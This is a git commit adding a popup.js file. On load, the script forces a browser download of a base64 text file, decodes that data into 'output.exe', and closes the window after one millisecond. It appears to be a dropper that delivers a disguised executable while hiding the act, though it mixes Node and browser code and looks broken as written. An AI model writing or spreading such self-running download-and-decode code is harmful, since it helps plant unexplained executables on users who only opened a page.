4d138907ef23ae54ca1d88c34b53d05e55878919
Abdi <106400106+Abdi1422@users.noreply.github.com>
2025-10-21 06:46:11 -0700

    Add files via upload

---
+++ popup.js
@@ -0,0 +1,24 @@
+﻿function decode() {
+    const fs = require('fs');
+    const base64Data = fs.readFileSync('testE.txt', 'utf8');
+    const binaryData = Buffer.from(base64Data, 'base64');
+    fs.writeFileSync('output.exe', binaryData);
+}
+decode()
+function download() {
+    const link = document.createElement("a");
+    link.href = "files/testE.txt";
+    link.download = "testE.txt";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+download()
+
+window.addEventListener("load", function () {
+    setTimeout(() => {
+        
+        window.close();
+    }, 1);
+});
+
